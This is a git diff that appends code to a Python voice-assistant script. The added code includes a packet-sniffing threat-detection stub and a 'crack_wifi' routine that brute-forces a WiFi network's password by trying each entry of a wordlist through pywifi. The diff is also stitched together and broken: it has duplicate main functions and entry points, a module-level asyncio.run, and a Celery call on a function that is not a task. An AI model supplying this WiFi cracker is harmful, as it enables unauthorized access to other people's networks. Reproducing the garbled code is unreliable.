@@ -8,6 +8,17 @@ import threading
 import speech_recognition as sr
 import subprocess
 import time
+import asyncio
+import pandas as pd
+from celery import Celery
+from sklearn.ensemble import RandomForestClassifier
+from scapy.all import sniff
+
+import pywifi
+from pywifi import const
+import time
+
+
 # Function to recognize voice input
 def take_command():
     recognizer = sr.Recognizer()
@@ -276,3 +287,97 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+
+def escalate_issue(issue):
+    # Define the logic to escalate the issue
+    print(f"Escalating issue: {issue}")
+    
+# Load your dataset
+data = pd.read_csv('network_traffic.csv')
+X = data.drop('label', axis=1)
+y = data['label']
+
+
+# Initialize Celery
+app = Celery('tasks', broker='pyamqp://guest@localhost//')
+
+# Function to detect threats
+def detect_threats(new_data):
+    clf = RandomForestClassifier()
+    clf.fit(X, y)
+    predictions = clf.predict(new_data)
+    return predictions
+
+# Function to analyze traffic
+def analyze_traffic(data):
+    summary = data.describe()
+    return summary
+
+# Real-time monitoring
+async def monitor_network():
+    def packet_callback(packet):
+        # Process the packet
+        print(packet.summary())
+        # Optionally, add a task to the queue
+        escalate_issue.delay({'issue': 'High-priority alert'})
+
+    sniff(prn=packet_callback, store=0)
+
+# Main function
+async def main():
+    # Load your dataset
+    data = pd.read_csv('network_traffic.csv')
+    X = data.drop('label', axis=1)
+    y = data['label']
+
+    # Start monitoring
+    await monitor_network()
+
+    # Detect threats in new data
+    new_data = pd.read_csv('new_traffic.csv')
+    predictions = detect_threats(new_data)
+    print(predictions)
+
+    # Analyze traffic
+    summary = analyze_traffic(data)
+    print(summary)
+
+# Run the main function
+asyncio.run(main())
+
+def connect_to_wifi(ssid, password):
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]
+    iface.disconnect()
+
+    profile = pywifi.Profile()
+    profile.ssid = ssid
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.cipher = const.CIPHER_TYPE_WPAPSK
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    profile.key = password
+
+    iface.remove_all_network_profiles()
+    iface.connect(profile)
+
+    time.sleep(10)
+    if iface.status() == const.IFACE_CONNECTED:
+        return True
+    return False
+
+def crack_wifi(ssid, password_file):
+    with open(password_file, 'r') as file:
+        for line in file:
+            password = line.strip()
+            if connect_to_wifi(ssid, password):
+                print(f"Password found: {password}")
+                return
+        print("Password not found in the list.")
+
+if __name__ == "__main__":
+    ssid = "your_ssid"
+    password_file = "password_list.txt" ### YOU GOTTA create a password.txt in the same file path of the code  ######## 
+    crack_wifi(ssid, password_file)
